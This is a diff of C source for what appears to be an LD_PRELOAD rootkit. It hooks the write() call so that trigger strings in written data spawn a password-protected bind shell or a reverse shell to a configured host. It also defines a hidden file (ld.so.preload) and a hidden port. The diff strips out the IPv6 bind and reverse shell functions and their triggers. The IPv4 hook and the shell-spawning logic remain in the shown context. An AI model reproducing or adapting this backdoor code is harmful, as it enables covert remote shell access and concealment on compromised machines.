@@ -11,62 +11,17 @@
 
 //bind-shell def
 #define K_4 "fakeuser4"
-#define K_6 "fakeuser6"
 #define PASSWORD "supersecurepassword1234#"
 #define LOCAL_PORT 65064
 //reverse-shell def
 #define K_REVERSE_4 "reverseshellipv4"
-#define K_REVERSE_6 "reverseshellipv6"
 #define REVERSE_HOST4 "127.0.0.1"
-#define REVERSE_HOST6 "::1"
 #define REVERSE_PORT 443
 //file to hide
 #define FILE_NAME "ld.so.preload"
 //port to hide in HEX 
 #define HEX_PORT "FE28"
 
-int ipv6_bind_shell (void)
-{
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(LOCAL_PORT);
-    addr.sin6_addr = in6addr_any;
-
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
-
-    const static int optval = 1;
-
-    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
-
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-
-    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    listen(sockfd, 0);
-
-    int new_sockfd = accept(sockfd, NULL, NULL);
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(new_sockfd, count);
-    }
-
-    char input[30];
-
-    read(new_sockfd, input, sizeof(input));
-    input[strcspn(input, "\n")] = 0;
-    if (strcmp(input, PASSWORD) == 0)
-    {
-        execve("/bin/sh", NULL, NULL);
-        close(sockfd);
-    }
-    else 
-    {
-        shutdown(new_sockfd, SHUT_RDWR);
-        close(sockfd);
-    }
-    
-}
 
 int ipv4_bind_shell (void)
 {
@@ -106,39 +61,9 @@ int ipv4_bind_shell (void)
         shutdown(new_sockfd, SHUT_RDWR);
         close(sockfd);
     }
-    
+
 }
 
-int ipv6_reverse (void)
-{
-    const char* host = REVERSE_HOST6;
-
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(REVERSE_PORT);
-    inet_pton(AF_INET6, host, &addr.sin6_addr);
-
-    struct sockaddr_in6 client;
-    client.sin6_family = AF_INET6;
-    client.sin6_port = htons(LOCAL_PORT);
-    client.sin6_addr = in6addr_any;
-
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
-
-    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
-
-    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(sockfd, count);
-    }
-
-    execve("/bin/sh", NULL, NULL);
-    close(sockfd);
-
-    return 0;
-}
 
 int ipv4_reverse (void)
 {
@@ -181,9 +106,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
 
 
     char *bind4 = strstr(buf, K_4);
-    char *bind6 = strstr(buf, K_6);
     char *rev4 = strstr(buf, K_REVERSE_4);
-    char *rev6 = strstr(buf, K_REVERSE_6);
 
     if (bind4 != NULL)
     {
@@ -192,25 +115,11 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
         ipv4_bind_shell();
     }
 
-    else if (bind6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv6_bind_shell();
-    }
-
     else if (rev4 != NULL)
     {
         fildes = open("/dev/null", O_WRONLY | O_APPEND);
         result = new_write(fildes, buf, nbytes);
         ipv4_reverse();
-    }
-
-    else if (rev6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv6_reverse();
     }
 
     else
